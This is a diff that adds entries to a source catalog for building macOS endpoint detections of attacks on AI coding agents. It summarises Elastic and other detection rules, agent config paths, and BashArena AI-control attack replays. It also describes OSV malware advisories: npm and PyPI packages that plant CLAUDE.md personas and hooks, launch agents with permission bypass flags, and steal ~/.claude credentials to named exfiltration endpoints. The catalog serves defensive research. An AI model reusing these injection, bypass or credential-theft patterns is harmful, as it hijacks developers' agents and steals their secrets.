+   "what": "Full sparse copy (313 TOML: 150 cross-platform, 100 macos, 29 integrations/anthropic, 34 openai_chatgpt_enterprise) plus a GenAI/macOS subset at the same commit. 'Unusual Process Modifying GenAI Configuration File' (created 2025-12-04, updated 2026-10-06) watches .cursor/mcp.json and settings.json, .claude/*, claude_desktop_config.json, .config/github-copilot, .codex, .gemini, .windsurf, .openclaw; excludes .claude cache/statsig/sessions/shell-snapshots/plugins/worktrees, .gemini/tmp, .codex sessions/tmp/log, .cursor/extensions, .claude.json.backup and lock/log/sqlite/jsonl. Others: 'GenAI Process Accessing Sensitive Files'; 'GenAI CLI Started with Unsafe Permission Bypass' (--dangerously-skip-permissions, --permission-mode bypassPermissions, --dangerously-bypass-approvals-and-sandbox, --full-auto, --yolo, --approval-mode=yolo, --allow-all-tools); 'GenAI Agent Instruction File Written to Downloads' (2026-10-27, cites forever.security); 'Claude Cowork VM Boot Image Tamper' (2026-08-05); 'Execution via OpenClaw Agent'; 'Multiple Credential Access by VS Code or Cursor IDE Descendant' (2026-10-26); 'Node.js Pre or Post-Install Script Execution'; 'Credential Access via TruffleHog Execution'; 'Remote GitHub Actions Runner Registration'; 'Anthropic MCP Server Created' (audit log); 'OpenAI ChatGPT Enterprise Unusual Codex Plugin Installed'. SpecterOps 'an evening with claude code' is cited by several.",
+   "license": "Elastic-2.0 (LICENSE.txt 'Elastic License 2.0' copied; GitHub API NOASSERTION). Redistribution allowed with notices; no hosted/managed-service offering.",
+   "redistributable": "yes",
+   "published": "main 1a666d71, committed 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-003",
+    "EAA-004",
+    "EAA-005",
+    "EAA-006",
+    "EAA-015",
+    "EAA-021"
+   ],
+   "eslogger_visible": "File-modification/open and process-start predicates map to eslogger close/create/rename/open and exec. ES|QL aggregations need windowed counts. Network, DNS/TLD and audit-integration rules are not endpoint-visible.",
+   "how_to_use": "Agent config path list as keep-list; exclusion list as known-benign churn (hard negatives); unsafe-flag and Downloads-instruction-file rules become exec/create cases. elastic-detection-rules-genai-macos is a subset of elastic-detection-rules (same commit): use the full copy.",
+   "downloaded_to": [
+    "datasets/elastic-detection-rules",
+    "datasets/elastic-detection-rules-genai-macos"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-047",
+   "name": "Elastic protections-artifacts: Elastic Defend endpoint behavior rules",
+   "url": "https://github.com/elastic/protections-artifacts/tree/main/behavior/rules",
+   "related_urls": [
+    "https://github.com/elastic/protections-artifacts"
+   ],
+   "angles": [
+    "telemetry",
+    "macos-threats"
+   ],
+   "kind": "detection-content",
+   "what": "Full shallow clone: 1,339 TOML EQL behavior rules (279 macOS, 34 cross-platform) and 1,057 .yar; plus a 313-rule macOS/cross-platform subset. 'Persistence via GenAI Tool': child/descendant of claude, cursor, codex, copilot, gemini-cli, windsurf, ollama, lmstudio, sandbox-exec etc. writing LaunchAgents/Daemons, rc.local, sudoers or Windows Startup; excludes JumpCloud, Homebrew 'brew services', watchman, Ollama-signed; cites Cymulate CVE-2025-54795 InversePrompt, SpecterOps, Straiker nomshub. Also 'Cursor Arbitrary Code Execution via PHP' (.vscode/settings.json, no Workspace Trust), 'Potential Execution via VS Code Tasks', 'Nodejs Initial Access via VSCode Auto-run Task' (team ID UBF8T346G9), 'Suspicious VSCode Extension Child Process', 'VScode Extension Install via URI Handler', 'Suspicious TruffleHog Execution via NodeJS', 'Bun Runtime Dropped and Executed via Node.js', 'Bun Script Attempted to Access IMDS Metadata', 'Suspicious Python Path Configuration File (.pth) Creation', 'Unsigned or Untrusted Binary Execution via Zshrc', 'VScode Project File Infection via Osascript', keychain/browser/wallet access rules. Exclusions name benign agent paths: /private/tmp/claude-*/scratchpad*, */.claude/shell-snapshots/*, ~/.local/share/claude/versions/*, Claude.app claude-code paths, ~/.claude/statusline-command.sh, claude-code vendored ripgrep. ransomware/testing programs were deleted from the clone.",
+   "license": "Elastic-2.0 (LICENSE.txt copied; per-rule license = 'Elastic License v2'; GitHub API NOASSERTION). Redistribution with notices; no managed-service offering.",
+   "redistributable": "yes",
+   "published": "main c7b3b2eb, 2026-10-23",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-015",
+    "EAA-019"
+   ],
+   "eslogger_visible": "Process and file rules map to exec/create/close; eslogger exec carries signing_id/team_id. Network-sequence rules only partly reproducible.",
+   "how_to_use": "Agent-descendant persistence cases and their exclusions (brew services, watchman) as hard negatives; benign agent paths from exclusions; rule names as labels. elastic-protections-behavior-macos is a subset of elastic-protections-artifacts (same commit).",
+   "downloaded_to": [
+    "datasets/elastic-protections-artifacts",
+    "datasets/elastic-protections-behavior-macos"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-048",
+   "name": "MacCrab ai_safety rules and labeled fixtures",
+   "url": "https://github.com/peterhanily/maccrab",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "detection-content",
+   "what": "Apache-2.0 local macOS ES detector. 212 Sigma-style YAML + 7 JSON graph rules downloaded. Rules/ai_safety (32): Claude settings/hook injection by non-Claude process (~/.claude/settings.json, settings.local.json, CLAUDE.md; dated 2026-05-13, cites Mini Shai-Hulud wave 4), MCP config injection by non-AI tool, MCP server added/suspicious command/tool poisoning, SKILL.md poisoning install, canary skill/rules read, binary dropped into Claude dir, project-config RCE, AI tool reads ssh/aws/.env or writes persistence/shell profile/git config, VS Code tasks.json modified by non-VS Code process, honeyprompt canary install. Graph rules: agent shell touches credential, lethal trifecta, LaunchAgent after credential access, worm self-propagation. Fixtures: fp_corpus.json (12 benign process cases), rule_corpus.json (36: 19 fire, 17 not), LLMEvalFixtures (3 alerts with expectedVerdict). BENCHMARK.md: FP-rate method, no executed TP benchmark.",
+   "license": "Apache-2.0 (LICENSE copied; GitHub API spdx Apache-2.0)",
+   "redistributable": "yes",
+   "published": "main e4ce98f5, 2026-10-09",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-004",
+    "EAA-006",
+    "EAA-009",
+    "EAA-010",
+    "EAA-015",
+    "EAA-019"
+   ],
+   "eslogger_visible": "Rules key on ES file writes and process creation (close/create/rename, exec). Prompt-injection/LLM rules use MacCrab's own trace parsing and are not ES-visible.",
+   "how_to_use": "Mine path lists and writer-exclusion lists for path rules and hard negatives; turn each ai_safety rule into a positive/negative eslogger pair; fp_corpus as dev-workstation negatives; LLMEvalFixtures as a judge-verdict template.",
+   "downloaded_to": [
+    "datasets/maccrab-rules-fixtures"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-049",
+   "name": "numbat (Perplexity) endpoint AI-agent detection rules",
+   "url": "https://github.com/perplexityai/numbat",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "detection-content",
+   "what": "Hooks, plugins, OTLP and on-disk session artifacts normalized to one event model, evaluated with CEL. 51 rule YAMLs: chains 6, exec 6, exfil 4, impact 4, integrity 2, lateral 1, persistence 6, privilege 6, recon 3, secrets 8, source_control 2, tamper 3. tamper/agent_config_write (14 KB) has hook/settings path regexes for Claude Code (incl. managed-settings), Codex (.codex/hooks.json, /etc/codex hooks.json and requirements.toml), Gemini, Cursor, Windsurf, Factory, Devin, Hermes, Copilot, Grok, Pi, Kimi, OpenClaw, Qwen, Cline, Augment, OpenHands, Crush, Junie, Muse, with macOS Library/Application Support and Windows ProgramData variants. Also tamper/guardrails_off, detector_state_write, exec/agent_runtime_bypass_flags, secrets/agent_read_env, developer/cloud_credential_read, persistence/shell_profile_write, git_hook_write, scheduler_install, integrity/history_tamper, chains secret_read_then_egress and permission_denied_then_runtime_bypass.",
+   "license": "Apache-2.0 (repo LICENSE; GitHub API)",
+   "redistributable": "yes",
+   "published": "repo 2026-07-24..2026-11-04 (HEAD ebb511ff)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-003",
+    "EAA-015"
+   ],
+   "eslogger_visible": "file.write/delete paths and command.exec argv map onto eslogger create/rename/unlink/close and exec; OTel/hook-only fields do not.",
+   "how_to_use": "Cross-check and extend the keep-path list from agent_config_write (broader than most); agent_runtime_bypass_flags for EAA-002 argv checks.",
+   "downloaded_to": [
+    "datasets/numbat-rules"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-050",
+   "name": "0x2ai-* npm packages: postinstall drops CLAUDE.md persona, .claude/settings.json, slash command and .mcp.json into INIT_CWD, then launches claude with permissions skipped",
+   "url": "https://osv.dev/vulnerability/MAL-2026-5602",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "16 records MAL-2026-5587..5602 (0x2ai-demo1..9x, -ivo, -multi-q, -multi-mq, -zoe), published 2026-06-11, withdrawn 2026-07-16. scripts/postinstall.cjs does fs.cpSync(payload, process.env.INIT_CWD || cwd) into the developer's project dir: CLAUDE.md (~12 KB persona telling the agent never to disclose its rules), .claude/settings.json (statusLine command), .claude/commands/0x2ai-boot.md, .mcp.json with BRIDGE_URL=https://<demo>.0x2ai.com and static BRIDGE_AUTH_TOKEN, chatroom-*.cjs MCP/monitor scripts. MCP tools provider_query, memory_save/load, chatroom_post, settings_set (accepts anthropic/openai keys) via the bridge. Boot command and persona make the agent start a long-poll listener and treat bridge messages as user input. bin/start.cjs re-stages and spawns `claude --dangerously-skip-permissions` with shell:true.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-06-11 (withdrawn 2026-07-16)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-006",
+    "EAA-007",
+    "EAA-001",
+    "EAA-002"
+   ],
+   "eslogger_visible": "create of CLAUDE.md, .claude/settings.json, .claude/commands/0x2ai-boot.md, .mcp.json, chatroom-*.cjs in the project root by node (parent npm); exec of sh -c claude --dangerously-skip-permissions from node; later node chatroom-*.cjs parented by claude. Not visible: bridge traffic.",
+   "how_to_use": "Case: npm lifecycle process writing agent instruction/config files outside node_modules (INIT_CWD). Withdrawn status makes these borderline judge cases.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-051",
+   "name": "@testsecuiitytestme/cache-helper (2026-10-27): Shai-Hulud-style npm worm that writes hooks into AI assistant configs",
+   "url": "https://raw.githubusercontent.com/ossf/malicious-packages/33cdd8087fa0dde00839cac62b2630d07453f72b/osv/malicious/npm/@testsecuiitytestme/cache-helper/MAL-2026-18358.json",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "MAL-2026-18358 (2026-10-29). Versions 1.0.1-1.0.7 (+0.0.0-stage) published 2026-10-27 12:28-22:12 UTC, unpublished 22:17. Static analysis only. postinstall loads a prebuilt native addon in several forms (record names only linux-x64 and win32-x64 prebuilds, so macOS execution is not shown); exits under CI/containers/debugger; XOR-decodes .napi_cache to a hidden temp file run detached; that finds or downloads bun 1.2.18 and runs an obfuscated Bun program (loader shape matches Shai-Hulud wave 2). Strings: credential collection (npm, GitHub, GitLab, PyPI, RubyGems, JFrog, Docker, cloud, Vault, k8s, .ssh, .git-credentials, .env, browser logins, macOS keychain, 1Password, Bitwarden); spreading via publishing, CI injection, and writes to 'AI assistant configuration (.claude/settings.json hooks, .cursor rules, .mcp.json, copilot-instructions.md, CLAUDE.md)'. Exfil endpoints not decoded.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-10-29",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-004",
+    "EAA-006",
+    "EAA-014"
+   ],
+   "eslogger_visible": "exec of node from npm postinstall; create + detached exec of a hidden temp file; bun download and exec; writes of .claude/settings.json, .cursor rules, .mcp.json, copilot-instructions.md, CLAUDE.md (fan-out); opens of keychain/credential files. Not visible: publishing, exfil.",
+   "how_to_use": "Newest worm wave planting all five instruction surfaces; model both 'installing repo only' and 'every reachable repo'. Pair with catalog ChainDrop and Mini Shai-Hulud cases for recall.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-052",
+   "name": "Agent-credential theft packages: litellm 1.107.0 (PyPI), beamz, claudechor, @signetai/signet-memory-openclaw, sextant-cli",
+   "url": "https://raw.githubusercontent.com/ossf/malicious-packages/33cdd8087fa0dde00839cac62b2630d07453f72b/osv/malicious/pypi/litellm/MAL-2026-2144.json",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "(a) litellm 1.107.0 (MAL-2026-2144, record from 2026-03-24, updated 2026-10-29 for a PyPI upload 2026-10-21 11:39-11:40 UTC): wheel ships cook.pth (`import cook`), cook.py and sitecustomize.py under litellm-1.107.0.data/purelib/, so the payload runs at every interpreter start; collects 'AI developer tool configurations (~/.cursor, ~/.claude, ~/.kiro, Windsurf)', cloud, k8s, SSH, GPG, .npmrc, .pypirc; POSTs to http://www.litellm.dev/healthcheck; marker /tmp/.pc_once_72129118c59f5636c0bb; hourly fetch-and-run via a raw.githubusercontent.com domain list. (b) beamz MAL-2026-5716, claudechor MAL-2026-5717 (2026-06-12): read ~/.claude/.credentials.json and ~/.claude.json, POST to a workers.dev endpoint. (c) @signetai/signet-memory-openclaw MAL-2026-4445 (2026-05-20, withdrawn 05-26): reads ~/.claude/.credentials.json and injects the OAuth token into api.anthropic.com requests with Claude Code impersonation headers. (d) sextant-cli-darwin-arm64 MAL-2026-11997 (2026-08-05): darwin/arm64 Go PTY/WebSocket remote shell to wss://relay.sextant.top, sk-ant- regex, strings for CLAUDE_CONFIG_DIR and ~/.claude.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-05-20..2026-10-29",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-005",
+    "EAA-015"
+   ],
+   "eslogger_visible": "opens of ~/.claude/.credentials.json, ~/.claude.json, ~/.cursor/*, ~/.kiro/*, Windsurf dirs by python (any python start) or node bins; create of /tmp/.pc_once_*; create of cook.pth, cook.py, sitecustomize.py in site-packages at pip install; exec of the sextant Go binary. Network not visible.",
+   "how_to_use": "Credential reads by non-agent processes; the litellm reader is a generic python started for unrelated work. Cheap supporting rule: *.pth or sitecustomize.py created in site-packages. signetai (withdrawn) as borderline. Distinct from the March 2026 TeamPCP litellm 1.82.7/1.82.8 compromise.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-059",
+   "name": "IronWorm-linked typosquats ship a binary at .claude/settings registered as a SessionStart hook",
+   "url": "https://osv.dev/vulnerability/MAL-2026-3648",
+   "related_urls": [],
+   "angles": [
+    "incidents"
+   ],
+   "kind": "incident-or-advisory",
+   "what": "MAL-2026-3648 auth-javascript, 3649 iceberg-javascript, 3652 supabase-javascript, 3650 microsoft-applicationinsights-common, 3651 ms-graph-types (2026-05-13) and 4542 crypto-javascript (2026-05-20); npm publishers 'superbase' and 'micresoft'; IronWorm campaign. Each bundles a 4.5 MB static UPX ELF at .claude/settings plus .claude/settings.json registering it as a SessionStart hook (crypto-javascript: 5,092,012-byte ELF at .claude/set, matcher '*'). preinstall runs the same binary; C2 207.90.194.2:443; harvests env, $HOME, /proc; targets cloud, registry and 'AI developer tools' credentials; injects Exodus. 4542: hook path persists with --ignore-scripts. Payload is Linux ELF only.",
+   "license": "Apache-2.0 (OSSF malicious-packages)",
+   "redistributable": "yes",
+   "published": "2026-05-13..2026-05-20",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-005"
+   ],
+   "eslogger_visible": "create of node_modules/<pkg>/.claude/settings.json and .claude/settings at extraction; fork/exec of sh for preinstall under npm; later sh -c hook as child of claude. On macOS execve of the ELF fails and ES emits no exec for a failed execve; only the parent shell (and any script fallback) shows.",
+   "how_to_use": "Case: hook command targeting an executable file inside .claude/, plus a lifecycle script pointing under .claude/. Rule: any exec of a file under a .claude/ dir. Hard negative: `node .claude/hooks/*.js` in the developer's own repo.",
+   "downloaded_to": [
+    "datasets/osv-mal-ai-agent"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-067",
+   "name": "agentic-leash real eslogger fixtures (dev Mac running Claude Code)",
+   "url": "https://github.com/velusgautam/agentic-leash/tree/main/tests/fixtures/eslogger",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "telemetry",
+   "what": "Eight JSONL files, 143 events at ES msg v10 (close/create/exec/exit/fork/open 20 each, rename 10, unlink 13), taken from a real 400k-event capture while Claude Code and T3 Code ran (docs/plans/spike-results.md, Task 0.2). Exec args after argv[0] and env redacted; eslogger/sentineld excluded. Writers include claude, bash, git, zsh, cfprefsd, Chrome, fseventsd. claude creates/renames ~/.claude.json.tmp.*, ~/.claude.json.lock, ~/.claude/backups/.claude.json.backup.*, /private/tmp/claude-<uid>/* and its node cache. Real Cursor CLI/IDE and Claude hook payload fixtures exist under tests/fixtures/hooks (not downloaded).",
+   "license": "MIT (repo LICENSE 'Copyright (c) 2026 Velu Gautam'; GitHub API spdx MIT; copied)",
+   "redistributable": "yes",
+   "published": "commit 4ad9f777, 2026-10-15",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "All ES events with full process and file fields; shows Claude Code's own ordinary state writes.",
+   "how_to_use": "Hard negatives and baseline: Claude's atomic rename of ~/.claude.json, backups and /private/tmp/claude-<uid> scratch must not be flagged as EAA-004/008. msg v10 schema fixture. Consider fetching the hook payload fixtures.",
+   "downloaded_to": [
+    "datasets/agentic-leash-eslogger"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-068",
+   "name": "BashArena kernel evidence (Tetragon kernel events of honest vs attack agent replays)",
+   "url": "https://huggingface.co/datasets/daaain/bash-arena-kernel-evidence",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "telemetry",
+   "what": "BashArena trajectories (Redwood Control Leaderboard) replayed tool call by tool call in a foldyard dev box (rootless podman, arm64, Lima on Apple silicon) under Tetragon. v2 (2026-11-04): 1,136 replays (576 honest, 560 attack: download_malware 143, sudo_edit 142, leak_passwords 139, disable_firewall 136); v2/replays.csv 18 columns (mode, side_task, side_task_landed, main_task_success, events_file, steps...); not yet monitor-scored. Events: gzipped JSONL with time, seq, kind (exec/exit/connect/file), binary, args, detail (read/write <path> or ip:port), uid, pid, ppid, parent, parent_args, exec_id, container... First 300 files: ~281k exec, 370k exit, 170k connect, 68k file (67.0k reads, 1.5k writes). v1 (2026-11-01, 820 replays) has Claude Haiku 5.5 monitor scores in Inspect logs (not downloaded). Fake credentials.",
+   "license": "CC-BY-SA-4.0 (HF card). Canary GUID; card says never put in training corpora. Replay code MIT (daaain/control-arena fork).",
+   "redistributable": "yes",
+   "published": "v1 2026-11-01, v2 2026-11-04 (rev 6c5f21f2)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-015"
+   ],
+   "eslogger_visible": "Linux Tetragon, not macOS: exec/exit map to eslogger exec/exit, file read/write to open/close-modified; connect must be dropped; Linux paths (/etc/sudoers, /etc/shadow, /home/app/.ssh, .aws/credentials, .config/gh/hosts.yml, .env, /opt/configs) need remapping.",
+   "how_to_use": "Closest public labeled agent-attack endpoint telemetry. Convert to eslogger-shaped records, remap paths; 576 honest replays as background, landed attacks as positives (credential reads, sudoers edits). No agent-config targets (EAA-003..014 not covered).",
+   "downloaded_to": [
+    "datasets/basharena-kernel-evidence"
+   ],
+   "value": 4
+  },
+  {
+   "id": "SRC-069",
+   "name": "Aider source: .aider.conf.yml search order, .env loading, history files, --yes-always",
+   "url": "https://raw.githubusercontent.com/Aider-AI/aider/5dc9490bb35f9729ef2c95d00a19ccd30c26339c/aider/main.py",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": ".aider.conf.yml searched in cwd, git root, home; a bare 'yes:' line rejected (use yes-always). Loads .env files (.env, git root, --env-file) with override=True, ~/.aider/oauth-keys.env first. .aider.model.settings.yml, .aider.model.metadata.json. AIDER_ env prefix, --openai-api-base, .aider.input.history and .aider.chat.history.md in the git root, --llm-history-file, --read, --yes-always, --env-file; .aider.tags.cache.v<N>; ~/.aider/analytics.json.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit 5dc9490b, 2026-05-22",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-004",
+    "EAA-005",
+    "EAA-007"
+   ],
+   "eslogger_visible": "Opens of .aider.conf.yml and .env by aider (python); appends to .aider.chat.history.md; --yes-always in python argv; AIDER_*/OPENAI_API_BASE env invisible unless in a .env.",
+   "how_to_use": "A planted repo .env (override=True) can redirect the API base; config adding yes-always or openai-api-base is EAA-002/007; identify aider by argv.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-070",
+   "name": "Amazon Q Developer CLI source: ~/.aws/amazonq paths, data.sqlite3, --trust-all-tools (unmaintained, now Kiro CLI)",
+   "url": "https://raw.githubusercontent.com/aws/amazon-q-developer-cli/15cc8f3cd18c4272925ce1c7053268eedff1ea0a/crates/chat-cli/src/util/paths.rs",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Workspace .amazonq/{cli-agents,prompts,mcp.json,cli-todo-lists,.subagents}, .amazonq/rules/**/*.md; default resources AmazonQ.md, AGENTS.md, README.md. Global ~/.aws/amazonq/{cli-agents,prompts,mcp.json,cli-checkouts,.cli_bash_history,global_context.json,profiles,knowledge_bases}. Logs $TMPDIR/qlog. ~/Library/Application Support/amazon-q/{settings.json,data.sqlite3} (conversations, state, auth_kv; credentials in state). MCP OAuth in ~/.aws/sso/cache. Flags: -r/--resume, --agent, -a/--trust-all-tools, --trust-tools=, --no-interactive. README: no longer maintained; now Kiro CLI (closed source).",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "main 15cc8f3c, 2026-04-23",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-005",
+    "EAA-006",
+    "EAA-015"
+   ],
+   "eslogger_visible": "File writes and data.sqlite3 churn visible; q chat argv carries --trust-all-tools/--no-interactive.",
+   "how_to_use": "Legacy path rules for machines that still have q; non-q reads of data.sqlite3 are EAA-005/015; ~/.aws/sso/cache reads by aws are normal. Argv: q chat --trust-all-tools --no-interactive.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-073",
+   "name": "DataClaw-exported coding-agent conversation datasets",
+   "url": "https://github.com/peteromallet/dataclaw",
+   "related_urls": [],
+   "angles": [
+    "benchmarks"
+   ],
+   "kind": "agent-footprint",
+   "what": "Harness (banodoco/dataclaw redirects here) that parses session logs from Claude Code, Codex, Cursor, Gemini, Hermes, Kimi, OpenClaw, OpenCode and custom sources and publishes HF datasets tagged 'dataclaw' with secret/PII redaction. HF API filter=dataclaw: 49 datasets, all tagged license:mit, 2026-02-24..2026-09-02; e.g. peteromallet/my-dataclaw-data (4,018 sessions, 94 projects, 162 JSONL, ~5.7 GB), misterkerns/my-personal-claude-code-data (~83 MB).",
+   "license": "Harness MIT (GitHub API); datasets tagged MIT; contents are personal developer data",
+   "redistributable": "yes",
+   "published": "harness 2026-02-24..2026-10-11; datasets 2026-02-24..2026-09-02",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [],
+   "eslogger_visible": "Tool calls map to exec/file events; the export itself reads ~/.claude/projects and Codex sessions (benign EAA-005 lookalike).",
+   "how_to_use": "Large real-developer benign background; sample a few small datasets; treat as personal data. Not downloaded.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-074",
+   "name": "Elastic integrations: Claude Code, Claude Cowork and Cursor telemetry samples",
+   "url": "https://github.com/elastic/integrations/tree/main/packages/claude_code",
+   "related_urls": [],
+   "angles": [
+    "telemetry"
+   ],
+   "kind": "agent-footprint",
+   "what": "80 pipeline-test inputs and expected ECS outputs. Claude Code (v0.3.0) events and traces streams; Claude Cowork (v0.1.1) OTel logs; event names include api_request, hook_registered, hook_execution_start/complete, mcp_server_connection, permission_mode_changed, plugin_loaded, skill_activated, tool_decision, tool_result, user_prompt. Cursor (v0.3.0) admin audit-log API/S3 test logs. Plus sample_event.json, docs, manifests.",
+   "license": "Elastic-2.0 (package manifests source.license 'Elastic-2.0'; repo LICENSE.txt copied)",
+   "redistributable": "yes",
+   "published": "main a2c28c43, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-003",
+    "EAA-006",
+    "EAA-009",
+    "EAA-012"
+   ],
+   "eslogger_visible": "None directly (agent's own OTel/audit records). Underlying hook execs, plugin dir writes and MCP process starts would be exec/create in eslogger.",
+   "how_to_use": "Field names for correlating OTel hook/plugin/MCP events with eslogger if judge context ever takes agent telemetry; shows which actions are self-reported (EAA-012).",
+   "downloaded_to": [
+    "datasets/elastic-integrations-ai-agent-samples"
+   ],
+   "value": 3
+  },
+  {
+   "id": "SRC-075",
+   "name": "Goose source and docs: config.yaml tmp+lock+rename, keyring/secrets.yaml, GOOSE_PATH_ROOT, GOOSE_MODE default auto",
+   "url": "https://raw.githubusercontent.com/aaif-goose/goose/bfe8ccd23de1d2c47a4cb2970d522f093ae7f2ba/crates/goose/src/config/base.rs",
+   "related_urls": [
+    "https://goose-docs.ai/docs/guides/config-files"
+   ],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Repo now aaif-goose/goose. Keyring service goose; config.yaml; secrets precedence env > keyring > secrets.yaml (+ .lock) when GOOSE_DISABLE_KEYRING; /etc/goose/config.yaml; GOOSE_ADDITIONAL_CONFIG_FILES; save writes config.tmp under an exclusive lock, fsync, rename over config.yaml. GOOSE_PATH_ROOT replaces all roots; a source comment cites ~/Library/Application Support/Block/goose/ for back-compat. ~/.agents/plugins, ~/.agents/agents. Hints .goosehints and AGENTS.md. Docs: ~/.config/goose/config.yaml on macOS/Linux; GOOSE_MODE auto|approve|chat|smart_approve, default auto; stdio extensions under extensions; permission.yaml; secrets.yaml plaintext with file storage.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit bfe8ccd2, 2026-11-04",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-002",
+    "EAA-004",
+    "EAA-006",
+    "EAA-008",
+    "EAA-015"
+   ],
+   "eslogger_visible": "config.tmp create + rename by goose; secrets.yaml (+.lock) reads/writes when the keyring is disabled; extension launches are goose children.",
+   "how_to_use": "Goose defaults to auto (no approvals), so unattended tool use is not anomalous for goose; a non-goose writer adding an extensions entry is EAA-006; GOOSE_PATH_ROOT is a shadow-root surface. macOS data dir unverified (source comment and docs differ).",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-076",
+   "name": "Roo Code source: mcp_settings.json, .roo dirs, safeWriteJson lock+tmp+bak swap",
+   "url": "https://raw.githubusercontent.com/RooCodeInc/Roo-Code/b867ec9145750d0ae1ff7f02d35406e9bf2a0b16/src/utils/safeWriteJson.ts",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Repo archived (last commit b867ec91, 2026-05-15). Files: api_conversation_history.json, ui_messages.json, mcp_settings.json, custom_modes.yaml, task_metadata.json, history_item.json, _index.json. Global ~/.roo and ~/.agents; McpHub watches project .roo/mcp.json; .roomodes. safeWriteJson: proper-lockfile lock, write .<name>.new_<ms>_<rand>.tmp, rename existing to .<name>.bak_<ms>_<rand>.tmp, rename new into place, unlink backup. rulesync marks Roo Code deprecated.",
+   "license": "Apache-2.0 (GitHub API spdx)",
+   "redistributable": "yes",
+   "published": "commit b867ec91, 2026-05-15 (archived)",
+   "in_eaa_catalog": false,
+   "eaa_techniques": [
+    "EAA-004",
+    "EAA-005",
+    "EAA-006"
+   ],
+   "eslogger_visible": "Each save: lock create, .new tmp create, rename to .bak, rename new into place, unlink .bak, lock removal, all by Code Helper (Plugin).",
+   "how_to_use": "Path rules .roo/{mcp.json,rules/**,rules-*/**,skills}, .roomodes, ~/.roo/**, globalStorage settings/mcp_settings.json and custom_modes.yaml; benign sequence template. Archived, but installs persist.",
+   "downloaded_to": [],
+   "value": 3
+  },
+  {
+   "id": "SRC-077",
+   "name": "ruler: agent-to-rules/MCP/skills/subagents path table and fan-out writer with .bak backups",
+   "url": "https://raw.githubusercontent.com/intellectronica/ruler/5e551e60952fb1c81c6c5ad6f5fe8b7a412bda87/README.md",
+   "related_urls": [],
+   "angles": [
+    "footprints"
+   ],
+   "kind": "agent-footprint",
+   "what": "Table of ~32 agents with rules file, MCP config, skills dir, subagents dir: Codex AGENTS.md, .codex/config.toml, .agents/skills, .codex/agents (.toml); Windsurf .windsurf/mcp_config.json, .windsurf/skills; Amazon Q .amazonq/rules/ruler_q_rules.md, .amazonq/mcp.json; Firebase Studio .idx/airules.md, .idx/mcp.json; OpenHands .openhands/microagents/repo.md; Junie .junie/guidelines.md, .junie/mcp/mcp.json, .junie/skills; Kilo Code .kilocode/mcp.json; Factory .factory/mcp.json, .factory/skills; Mistral Vibe .vibe/config.toml; Trae .trae/rules/project_rules.md; Warp WARP.md; Kiro .kiro/steering/ruler_kiro_instructions.md. Options --mcp-overwrite, --gitignore (default true), --gitignore-local (.git/info/exclude), --backup (.bak, default on).",
+   "license": "MIT (GitHub API spdx)",
